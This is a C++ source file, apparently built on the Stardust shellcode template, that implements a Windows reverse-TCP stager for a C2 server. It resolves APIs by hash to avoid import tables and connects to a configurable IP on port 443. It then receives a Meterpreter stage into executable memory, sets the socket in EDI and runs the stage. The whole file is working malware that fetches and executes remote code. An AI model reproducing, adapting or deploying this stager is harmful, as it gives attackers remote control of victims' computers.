#include <common.h>
#include <constexpr.h>
#include <resolve.h>

using namespace stardust;

// Define IP adress of your C2 Stager
#define IP_STR  "10.10.10.10"
// Define PORT 443 of your C2 Stager
#define PORT 443

// We dont have HTONS or HTONL, so we must define it manually
#define HTONS(x) ( ( (( (USHORT)(x) ) >> 8 ) & 0xff) | ((( (USHORT)(x) ) & 0xff) << 8) )
#define HTONL(x) ( \
    ((x) << 24) | \
    (((x) << 8) & 0xFF0000) | \
    (((x) >> 8) & 0xFF00) | \
    ((x) >> 24) \
)

extern "C" auto declfn entry(
    _In_ void* args
) -> void {
    stardust::instance()
        .start(args);
}

declfn instance::instance(
    void
) {
    //
    // calculate the shellcode base address + size
    base.address = RipStart();
    base.length = (RipData() - base.address) + END_OFFSET;

    //
    // load the modules from PEB or any other desired way
    //

    if (!((ntdll.handle = resolve::module(expr::hash_string<wchar_t>(L"ntdll.dll"))))) {
        return;
    }

    if (!((kernel32.handle = resolve::module(expr::hash_string<wchar_t>(L"kernel32.dll"))))) {
        return;
    }

    //
    // let the macro handle the resolving part automatically
    //

    RESOLVE_IMPORT(ntdll);
    RESOLVE_IMPORT(kernel32);
}

auto declfn instance::start(
    _In_ void* arg
) -> void {

    const auto user32 = kernel32.LoadLibraryA(symbol<const char*>("user32.dll"));
    decltype(MessageBoxA)* msgbox = RESOLVE_API(reinterpret_cast<uintptr_t>(user32), MessageBoxA);
    decltype(MessageBoxW)* msgboxw = RESOLVE_API(reinterpret_cast<uintptr_t>(user32), MessageBoxW);

    DBG_PRINTF("running from %ls (Pid: %d)\n",
        NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer,
        NtCurrentTeb()->ClientId.UniqueProcess);

    DBG_PRINTF("shellcode @ %p [%d bytes]\n", base.address, base.length);

    // Initialize MessageboxW Content
    auto Caption = NtCurrentPeb()->ProcessParameters->ImagePathName.Buffer;
	auto Message = L"0";

	// Load ws2_32.dll for Socket related Functions
    const auto ws2_32 = kernel32.LoadLibraryA(symbol<const char*>("ws2_32.dll"));
    if (ws2_32) {
        //Message = L"ws2_32.dll successfully loaded";
        //msgboxw(nullptr, Message, Caption, MB_OK);
        DBG_PRINTF("ws2_32.dll successfully loaded");
    }
    else {
        DBG_PRINTF("- something went wrong. failed to load ws2_32 :/\n");
        Message = L"ws2_32.dll failed to load";
        msgboxw(nullptr, Message, Caption, MB_OK);
    }

    // Allright, lets start

    // First we need to translate the IP Adress from String to Binary
	auto ip_string = IP_STR;    // IP_STR is defined at the top of the file

        unsigned long ip_addr = 0;
        int octet = 0;
        int shift = 24;
        unsigned long num = 0;

        while (*ip_string) {
            if (*ip_string == '.') {
                ip_addr |= (num << shift);
                num = 0;
                shift -= 8;
                octet++;
            }
            else if (*ip_string >= '0' && *ip_string <= '9') {
                num = num * 10 + (*ip_string - '0');
                if (num > 255) {
                    // Invalid IP address
                    Message = L"Invalid Input IP Adress";
                    msgboxw(nullptr, Message, Caption, MB_OK);

                }
            }
            else {
                // Invalid character
                Message = L"Invalid Char in Input IP Adress";
                msgboxw(nullptr, Message, Caption, MB_OK);
            }
            ip_string++;
        }

        // Add the last octet
        ip_addr |= (num << shift);

        // Check if all four octets are present
        if (octet != 3) {
            // Invalid IP address
            Message = L"Something went wrong on generating IP Adress output";
            msgboxw(nullptr, Message, Caption, MB_OK);
        }
		// done with the IP translation

    // Convert unsigned long IP address to in_addr structure
    struct in_addr ipStruct;
    ipStruct.s_addr = HTONL(ip_addr);
    // Done calculating the IP, from now use ip_addr!

    // Initiate WSA
    WSADATA wsaData;
    decltype(WSAStartup)* wsastart = RESOLVE_API(reinterpret_cast<uintptr_t>(ws2_32), WSAStartup);
    if (wsastart(MAKEWORD(2, 0), &wsaData) != 0) {
        Message = L"WSA_Startup_Error";
        msgboxw(nullptr, Message, Caption, MB_OK);
    }

    // Initiate Socket
    decltype(socket)* socketfunc = RESOLVE_API(reinterpret_cast<uintptr_t>(ws2_32), socket);
    SOCKET ConnectSocket = socketfunc(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ConnectSocket == INVALID_SOCKET) {
        Message = L"Socket Setup Failed";
        msgboxw(nullptr, Message, Caption, MB_OK);
    }

    // Socket Setup with Protocol, Port and IP
    struct sockaddr_in clientService;
    clientService.sin_family = AF_INET;
    // Copy the converted IP address to sockaddr_in structure
    memcpy(&clientService.sin_addr, &ipStruct, sizeof(ipStruct));
    clientService.sin_port = HTONS(PORT);

    // Connect to Server
    decltype(connect)* connectfunc = RESOLVE_API(reinterpret_cast<uintptr_t>(ws2_32), connect);
    if (connectfunc(ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService)) == SOCKET_ERROR) {
        Message = L"Socket Connection Failed";
        msgboxw(nullptr, Message, Caption, MB_OK);
    }

    //////////////////////////////
    // When reverse_tcp and bind_tcp are used, the multi/handler sends the size of the stage in the first 4 bytes before the stage itself
    // So, we read first 4 bytes to use it for memory allocation calculations and write them to buffersize
    //////////////////////////////
    int bufferSize;
    unsigned char* data;
    // Receive the buffer size via first 4 bytes
    decltype(recv)* recvfunc = RESOLVE_API(reinterpret_cast<uintptr_t>(ws2_32), recv);
    int recvResult = recvfunc(ConnectSocket, (char*)&bufferSize, 4, 0);
    if (recvResult <= 0) {
        // Handle recv error
        Message = L"receiving of first 4 bytes failed";
        msgboxw(nullptr, Message, Caption, MB_OK);
    }

    // Now that we know the buffer size we can initialize Data
	// We need VirtualAlloc from kernel32	
    const auto k32 = kernel32.LoadLibraryA(symbol<const char*>("kernel32.dll"));
    decltype(VirtualAlloc)* virtuallocfunc = RESOLVE_API(reinterpret_cast<uintptr_t>(k32), VirtualAlloc);
    data = (unsigned char*)virtuallocfunc(NULL, bufferSize + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (data == NULL) {
        // Handle VirtualAlloc error
        Message = L"Virtual Alloc Error";
        msgboxw(nullptr, Message, Caption, MB_OK);
    }

    // Q: why did we allocate bufsize+5? what's those extra 5 bytes?
    // A: the Meterpreter stage is a large shellcode "ReflectiveDll", and when the stage gets executed, IT IS EXPECTING TO HAVE THE SOCKET NUMBER IN _EDI_ register.
    //    so, we want the following to take place BEFORE executing the stage: "mov edi, [socket]"
    //    opcode for "mov edi, imm32" is 0xBF
    data[0] = 0xbf; // opcode of "mov edi, WhateverFollows"

    memcpy(data + 1, &ConnectSocket, 4); // Adress of the socket

    // now we fetch the remaining bytes the Socket still holds and write it to Data
    int location = 0;
    int received = 0;

    int remaining = bufferSize;

    while (remaining > 0) {
        
        received = recvfunc(ConnectSocket, (char*)(data + 5 + location), remaining, 0);
        if (received <= 0) {
            Message = L"receive remaining data error";
            msgboxw(nullptr, Message, Caption, MB_OK);
        }
        location += received;
        remaining -= received;
    }

    Message = L"We are all made of Stardust!";
    msgboxw(nullptr, Message, Caption, MB_OK);

    //ready to rumble
    ((void(*)())data)();
}
